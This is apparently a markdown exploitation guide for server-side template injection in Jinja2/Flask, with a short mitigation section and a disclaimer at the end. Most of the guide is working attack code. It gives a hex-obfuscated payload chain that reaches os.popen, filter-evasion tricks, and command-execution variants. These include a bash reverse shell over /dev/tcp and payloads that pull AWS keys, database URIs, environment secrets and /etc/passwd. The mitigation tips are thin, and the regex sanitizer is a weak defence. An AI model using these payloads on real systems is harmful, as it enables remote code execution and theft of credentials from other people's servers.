
# 🛠️ Server-Side Template Injection (SSTI) Exploitation Guide

## 🎯 Working Payload (Jinja2)
```jinja2
{{ config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("id")|attr("read")() }}
```

### ✅ Output Example:
```text
uid=1000(app) gid=1000(app) groups=1000(app)
```

---

## 🧩 Payload Breakdown

### 1. Access the Config Object
```jinja2
{{ config }}
```
- Flask's `config` object.
- Available by default in templates.
- Stores settings like DB credentials, secrets, and environment.

---

### 2. Get the Object's Class
```jinja2
|attr("\x5f\x5fclass\x5f\x5f")
```
- `\x5f` = `_` (underscore)
- Equivalent to: `config.__class__`
- Returns: `<class 'flask.config.Config'>`

---

### 3. Access Class Initializer
```jinja2
|attr("\x5f\x5finit\x5f\x5f")
```
- Equivalent to: `__init__`
- Accesses the constructor of the `Config` class.
- Critical for accessing the method’s **globals**.

---

### 4. Retrieve Global Variables
```jinja2
|attr("\x5f\x5fglobals\x5f\x5f")
```
- Equivalent to: `__globals__`
- Returns global variables of the function scope.
- Includes builtins and imported modules (like `os`).

---

### 5. Access the OS Module
```jinja2
|attr("\x5f\x5fgetitem\x5f\x5f")("os")
```
- Equivalent to: `['os']`
- Accesses the `os` module from globals.

---

### 6. Execute System Command
```jinja2
|attr("popen")("id")
```
- Executes `os.popen("id")`
- Opens a pipe to run system command.

---

### 7. Read Command Output
```jinja2
|attr("read")()
```
- Calls `read()` on the result from `popen()`
- Outputs the system command result.

---

## 🧠 Key Exploitation Techniques

### 🔐 Obfuscation Methods

#### 1. Hex Escaping
```jinja2
"\x5f\x5fclass\x5f\x5f"  // Equivalent to: __class__
```
- Useful for bypassing WAFs and filters.

#### 2. Base64 Encoding
```jinja2
{{ config|attr("X19jbGFzc19f"|b64d) }}
```
- Assumes a custom filter `b64d` for decoding base64.

#### 3. String Concatenation
```jinja2
{% set u=95|chr %}{{ config|attr(u~u~"class"~u~u) }}
```
- Dynamically builds attribute names to evade detection.

---

## 🖥️ Command Execution Variants

### 1. Run Command with Output
```jinja2
{{ ... |attr("popen")("whoami; pwd; ls -la")|attr("read")() }}
```

### 2. Blind Command Execution (Time Delay)
```jinja2
{{ ... |attr("system")("sleep 10") }}
```

### 3. Reverse Shell (Bash)
```jinja2
{{ ... |attr("popen")("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")|attr("read")() }}
```

---

## 🔓 Sensitive Data Extraction

### Database URI
```jinja2
{{ config.SQLALCHEMY_DATABASE_URI }}
```

### AWS Secrets
```jinja2
{{ config.AWS_ACCESS_KEY_ID }}
{{ config.AWS_SECRET_ACCESS_KEY }}
```

### Environment Variables
```jinja2
{{ ... |attr("getenv")("DB_PASSWORD") }}
```

### File Reading
```jinja2
{{ ... |attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("open")("/etc/passwd")|attr("read")() }}
```

---

## 🛡️ Mitigation Strategies

### 1. Template Sanitization
```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment(autoescape=True)
```

---

### 2. Input Validation
```python
import re
def sanitize_input(input_str):
    return re.sub(r'[{}]|attr|__|\|', '', input_str)
```

---

### 3. Security Hardening
```python
# Disable builtins
app.jinja_env.globals['__builtins__'] = None

# Remove secrets
app.config.pop('SECRET_KEY', None)
app.config.pop('DATABASE_URI', None)
```

---

### 4. WAF Rules (ModSecurity Example)
```text
# Detect double braces
SecRule REQUEST_FILENAME "@rx \{\{.*\}\}" \
    "id:1001,deny,msg:'SSTI Attempt'"

# Block hex-encoded underscores
SecRule REQUEST_URI|REQUEST_BODY "@rx \\x5f\\x5f" \
    "id:1002,deny,msg:'Hex-encoded SSTI'"
```

---

## 🔍 Detection Payloads

### Basic Evaluation
```jinja2
{{ 7*7 }} → 49
```

### Probe Flask Environment
```jinja2
{{ config }}
```

### Class Hierarchy
```jinja2
{{ ''.__class__.__mro__ }}
```

### Global Variables
```jinja2
{{ config.__class__.__init__.__globals__.keys() }}
```

---

## 📌 Exploit Development Cheat Sheet

| **Component**          | **Jinja2 Syntax**                                      | **Hex-Escaped Version**                         |
|------------------------|--------------------------------------------------------|--------------------------------------------------|
| Underscore             | `_`                                                    | `\x5f`                                           |
| `__class__`            | `__class__`                                            | `\x5f\x5fclass\x5f\x5f`                          |
| `__init__`             | `__init__`                                             | `\x5f\x5finit\x5f\x5f`                           |
| `__globals__`          | `__globals__`                                          | `\x5f\x5fglobals\x5f\x5f`                        |
| `__getitem__`          | `__getitem__`                                          | `\x5f\x5fgetitem\x5f\x5f`                        |
| Dictionary Access      | `['os']`                                               | `("\x5f\x5fgetitem\x5f\x5f")("os")`              |
| Method Execution       | `popen("id")`                                          | `attr("popen")("id")`                            |

---

## ⚠️ Disclaimer

> This guide is for **educational purposes only**.  
> Do not attempt to exploit SSTI on systems you do not own or have explicit permission to test.  
> **Unauthorized access is illegal** and punishable under cybersecurity laws.
